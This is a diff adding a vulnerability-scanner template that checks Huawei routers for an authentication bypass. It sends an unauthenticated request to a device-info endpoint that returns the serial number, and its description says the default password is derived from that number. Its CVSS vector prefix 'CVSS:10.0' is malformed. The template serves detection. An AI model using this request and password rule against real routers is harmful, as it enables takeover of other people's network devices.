@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          type: word
+          words:
+            - DeviceName
+            - SerialNumber
+            - HardwareVersion
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/system/deviceinfo HTTP/1.1
+          Host: {{Hostname}}
+          Accept: application/json, text/javascript, */*; q=0.01
+          Referer: {{BaseURL}}
+id: huawei-router-auth-bypass
+info:
+    author: gy741
+    classification:
+        cvss-metrics: CVSS:10.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-288
+    description: Huawei Routers are vulnerable to authentication bypass because the default password of this router is the last 8 characters of the device's serial number which exist on the back of the device.
+    metadata:
+        max-request: 1
+    name: Huawei Router - Authentication Bypass
+    reference:
+        - https://www.exploit-db.com/exploits/48310
+    severity: critical
+    tags:
+        - auth-bypass
+        - router
+        - edb
+        - huawei
+        - HuaWei-Router
